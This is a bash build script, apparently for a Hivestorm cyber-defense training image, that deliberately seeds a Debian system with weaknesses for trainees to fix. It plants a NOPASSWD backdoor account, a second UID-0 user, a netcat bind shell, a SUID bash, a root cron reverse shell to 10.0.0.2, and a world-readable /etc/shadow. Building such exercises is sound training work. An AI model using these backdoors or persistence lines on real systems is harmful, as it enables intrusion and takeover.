#!/bin/bash
# Hivestorm HS20 scenario-01 — seed misconfigurations + partial compromise.
#
# Runs at image build time. Reads randomized identities from
# /etc/sysrepair/roles.json and plants the issues keyed off those names, so no
# two builds look identical.
set -euo pipefail

ROLES=/etc/sysrepair/roles.json

# Debian 9 repos are archived.
cat >/etc/apt/sources.list <<'EOF'
deb http://archive.debian.org/debian stretch main contrib non-free
deb http://archive.debian.org/debian-security stretch/updates main contrib non-free
EOF
echo 'Acquire::Check-Valid-Until "false";' >/etc/apt/apt.conf.d/99no-check-valid

apt-get update
apt-get install -y --no-install-recommends \
    jq sudo cron rsyslog procps iproute2 curl \
    openssh-server openssh-client sshpass \
    apache2 mariadb-server \
    php libapache2-mod-php php-mysql \
    netcat-traditional

# ---- parse randomized role map ------------------------------------------------
ADMIN=$(jq -r .admin_user           "$ROLES")
ADMIN_PW=$(jq -r .admin_weak_password "$ROLES")
BACKDOOR=$(jq -r .backdoor_user     "$ROLES")
EXTRA_UID0=$(jq -r .extra_uid0_user "$ROLES")
TROJAN=$(jq -r .trojan_path         "$ROLES")
SUID_PLANT=$(jq -r .suid_plant      "$ROLES")
CRON_PATH=$(jq -r .cron_path        "$ROLES")
PORT=$(jq -r .listener_port         "$ROLES")

# ---- users --------------------------------------------------------------------
useradd -m -s /bin/bash "$ADMIN"
echo "${ADMIN}:${ADMIN_PW}" | chpasswd
usermod -aG sudo "$ADMIN"

# Backdoor account: unauthorized, NOPASSWD sudo.
useradd -m -s /bin/bash "$BACKDOOR"
echo "${BACKDOOR}:changeme" | chpasswd
echo "${BACKDOOR} ALL=(ALL) NOPASSWD:ALL" >/etc/sudoers.d/90-${BACKDOOR}
chmod 0440 /etc/sudoers.d/90-${BACKDOOR}

# Second root (UID 0 duplicate).
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash "$EXTRA_UID0" || true

# Weak login.defs.
sed -ri 's/^PASS_MAX_DAYS.*/PASS_MAX_DAYS 99999/' /etc/login.defs
sed -ri 's/^PASS_MIN_DAYS.*/PASS_MIN_DAYS 0/'     /etc/login.defs
sed -ri 's/^UMASK.*/UMASK 022/'                    /etc/login.defs

# ---- sshd --------------------------------------------------------------------
mkdir -p /var/run/sshd
sed -ri 's/^#?PermitRootLogin.*/PermitRootLogin yes/'            /etc/ssh/sshd_config
sed -ri 's/^#?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -ri 's/^#?PermitEmptyPasswords.*/PermitEmptyPasswords yes/'   /etc/ssh/sshd_config

# ---- apache / php ------------------------------------------------------------
cat >/etc/apache2/conf-available/hs-bad.conf <<'EOF'
ServerTokens Full
ServerSignature On
<Directory /var/www/html>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>
EOF
a2enconf hs-bad >/dev/null
echo "<?php phpinfo(); ?>" >/var/www/html/info.php

# PHP dangerous toggles.
PHPINI=$(ls /etc/php/*/apache2/php.ini | head -n1)
sed -ri 's/^;?allow_url_include.*/allow_url_include = On/'  "$PHPINI"
sed -ri 's/^;?expose_php.*/expose_php = On/'                "$PHPINI"

# ---- mariadb -----------------------------------------------------------------
sed -ri 's/^bind-address.*/bind-address = 0.0.0.0/' /etc/mysql/mariadb.conf.d/50-server.cnf
# Root has no password by default in stretch's mariadb image; leave it that way.

# ---- sysctl ------------------------------------------------------------------
cat >/etc/sysctl.d/99-hs-bad.conf <<'EOF'
net.ipv4.ip_forward=1
net.ipv4.conf.all.accept_redirects=1
net.ipv4.conf.all.send_redirects=1
net.ipv4.conf.default.accept_source_route=1
EOF

# ---- trojaned binary + listener ---------------------------------------------
mkdir -p "$(dirname "$TROJAN")"
cp /bin/nc.traditional "$TROJAN"
chmod 0755 "$TROJAN"

cat >/usr/local/sbin/hs-backdoor.sh <<EOF
#!/bin/bash
# Unauthorized listener planted by intruder.
while true; do
  $TROJAN -l -p $PORT -e /bin/bash || sleep 5
done
EOF
chmod 0755 /usr/local/sbin/hs-backdoor.sh

# ---- SUID plant --------------------------------------------------------------
mkdir -p "$(dirname "$SUID_PLANT")"
cp /bin/bash "$SUID_PLANT"
chmod 4755 "$SUID_PLANT"

# ---- rogue cron --------------------------------------------------------------
cat >"$CRON_PATH" <<EOF
# Installed by intruder.
*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.2/${PORT} 0>&1' >/dev/null 2>&1
EOF
chmod 0644 "$CRON_PATH"

# ---- loosen /etc/shadow perms (classic) --------------------------------------
chmod 0644 /etc/shadow

# ---- supervisor --------------------------------------------------------------
cat >/usr/local/sbin/hs-start.sh <<'EOF'
#!/bin/bash
service rsyslog start || true
service cron    start || true
service mysql   start || true
service apache2 start || true
/usr/local/sbin/hs-backdoor.sh &
exec /usr/sbin/sshd -D -e
EOF
chmod 0755 /usr/local/sbin/hs-start.sh

apt-get clean
rm -rf /var/lib/apt/lists/*
